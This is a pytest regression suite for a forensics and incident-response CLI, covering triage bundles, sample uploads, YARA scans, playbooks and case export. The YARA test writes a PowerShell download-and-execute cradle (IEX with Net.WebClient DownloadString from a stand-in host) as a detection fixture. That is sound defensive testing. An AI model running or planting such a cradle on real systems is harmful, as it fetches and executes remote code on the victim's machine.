"""Regression tests for upgraded DFIR tools in OutPost CLI."""

import json
from pathlib import Path
from unittest.mock import patch

import pytest
from typer.testing import CliRunner

from outpost.commands.forensics import app as forensics_app
from outpost.commands.investigations import app as investigations_app
from outpost.commands.playbooks import app as playbooks_app
from outpost.commands.samples import samples
from outpost.commands.yara import app as yara_app
from outpost.main import app as main_app

runner = CliRunner()


def test_cli_forensics_triage_pack_output(tmp_path: Path):
    """Test 'outpost forensics triage-pack --output <file>' writes JSON triage bundle."""
    out_file = tmp_path / "triage.json"
    fake_pack = {
        "triage_id": "triage_test_12345",
        "collected_at": "2026-09-14T03:00:00Z",
        "host_id": "endpoint-01",
        "hostname": "endpoint-01",
        "platform": "linux",
        "metrics": {"cpu_percent": 10.5, "memory_percent": 30.0},
        "summary": {
            "severity": "clean",
            "total_processes": 45,
            "total_sockets": 12,
            "total_probes_executed": 5,
            "probe_anomalies_count": 0,
            "yara_threats_count": 0,
        },
        "probe_results": {
            "crontab_persistence": {
                "name": "Crontab Persistence",
                "tactic": "Persistence",
                "total_items": 3,
                "anomalies_count": 0,
            }
        },
    }

    with patch("outpost.lib.api_client.collect_forensic_triage", return_value=fake_pack):
        res = runner.invoke(forensics_app, ["triage-pack", "--host", "endpoint-01", "--output", str(out_file)])
        assert res.exit_code == 0
        assert "Triage ID:" in res.stdout
        assert "triage_test_12345" in res.stdout
        assert out_file.exists()
        loaded = json.loads(out_file.read_text())
        assert loaded["triage_id"] == "triage_test_12345"


def test_cli_samples_upload_command(tmp_path: Path):
    """Test 'outpost samples --upload <path>' uploads local binary and displays info."""
    bin_file = tmp_path / "malware.bin"
    bin_file.write_bytes(b"\x7fELF\x02\x01\x01\x00" + b"X" * 100)

    fake_upload_res = {
        "sample_id": "s_test_up_123",
        "detected_platform": "linux",
        "family": "trojan_stealer",
        "sha256": "abcdef1234567890",
        "yara_rules": ["elf-header"],
    }

    with patch("outpost.lib.api_client.upload_sample", return_value=fake_upload_res):
        res = runner.invoke(main_app, ["samples", "--upload", str(bin_file)])
        assert res.exit_code == 0
        assert "Sample ID:" in res.stdout
        assert "s_test_up_123" in res.stdout
        assert "LINUX" in res.stdout
        assert "trojan_stealer" in res.stdout


def test_cli_yara_scan_directory(tmp_path: Path):
    """Test 'outpost yara scan <dir>' discovers signature hits."""
    clean_file = tmp_path / "clean.txt"
    clean_file.write_text("ordinary text document")

    sus_file = tmp_path / "powershell.ps1"
    sus_file.write_text("IEX(New-Object Net.WebClient).DownloadString('http://bad.io')")

    res = runner.invoke(yara_app, ["scan", str(tmp_path)])
    assert res.exit_code == 0
    assert "powershell" in res.stdout
    assert "Threat Matches: 1 file(s)" in res.stdout
    assert "Files Scanned:" in res.stdout


def test_cli_investigations_playbooks_and_execute():
    """Test 'outpost investigations playbooks' and execute-playbook."""
    fake_playbooks = [
        {
            "id": "ransomware_containment",
            "name": "Ransomware Protocol",
            "severity": "critical",
            "tactic": "Impact",
            "tasks": [{"title": "Isolate"}],
            "recommended_probes": ["deleted_binaries"],
        }
    ]
    fake_exec_res = {
        "investigation_id": "inv_test_999",
        "playbook_id": "ransomware_containment",
        "playbook_name": "Ransomware Protocol",
        "status": "completed",
        "contained": True,
        "tasks_instantiated": 8,
        "probes_executed_count": 3,
        "total_anomalies_detected": 0,
        "actions_taken": ["Instantiated 8 tasks", "Host isolated in network containment"],
    }

    with patch("outpost.lib.api_client.list_investigation_playbooks", return_value=fake_playbooks):
        res_list = runner.invoke(investigations_app, ["playbooks"])
        assert res_list.exit_code == 0
        assert "Incident Response Playbooks" in res_list.stdout
        assert "ransomware" in res_list.stdout.lower()

    with patch("outpost.lib.api_client.execute_investigation_playbook", return_value=fake_exec_res):
        res_exec = runner.invoke(
            investigations_app,
            ["execute-playbook", "inv_test_999", "ransomware_containment", "--contain"],
            env={"COLUMNS": "200"},
        )
        assert res_exec.exit_code == 0
        assert "SOAR Playbook Execution Complete" in res_exec.stdout
        assert "NETWORK ISOLATED" in res_exec.stdout


def test_cli_investigations_export(tmp_path: Path):
    """Test 'outpost investigations export <id> [--format json|markdown] [--output <path>]'."""
    md_content = b"# OUTPOST INCIDENT RESPONSE CASE BRIEF\n## Case ID: inv_abc123\nTitle: Ransomware Alpha\n"
    json_content = json.dumps({"case": {"id": "inv_abc123", "title": "Ransomware Alpha"}}).encode("utf-8")

    with patch("outpost.lib.api_client.export_investigation", return_value=md_content):
        # 1. Export markdown to stdout
        res_md = runner.invoke(investigations_app, ["export", "inv_abc123"])
        assert res_md.exit_code == 0
        assert "OUTPOST INCIDENT RESPONSE CASE BRIEF" in res_md.stdout
        assert "Ransomware Alpha" in res_md.stdout

        # 2. Export markdown to file
        target_file = tmp_path / "dossier.md"
        res_file = runner.invoke(investigations_app, ["export", "inv_abc123", "--output", str(target_file)])
        assert res_file.exit_code == 0
        assert target_file.exists()
        assert "OUTPOST INCIDENT RESPONSE CASE BRIEF" in target_file.read_text(encoding="utf-8")

    with patch("outpost.lib.api_client.export_investigation", return_value=json_content):
        # 3. Export json to stdout
        res_json = runner.invoke(investigations_app, ["export", "inv_abc123", "--format", "json"])
        assert res_json.exit_code == 0
        assert "inv_abc123" in res_json.stdout
        assert "Ransomware Alpha" in res_json.stdout

    # 4. Invalid format validation
    res_bad = runner.invoke(investigations_app, ["export", "inv_abc123", "--format", "yaml"])
    assert res_bad.exit_code == 1
    assert "--format must be 'markdown' or 'json'" in res_bad.stdout

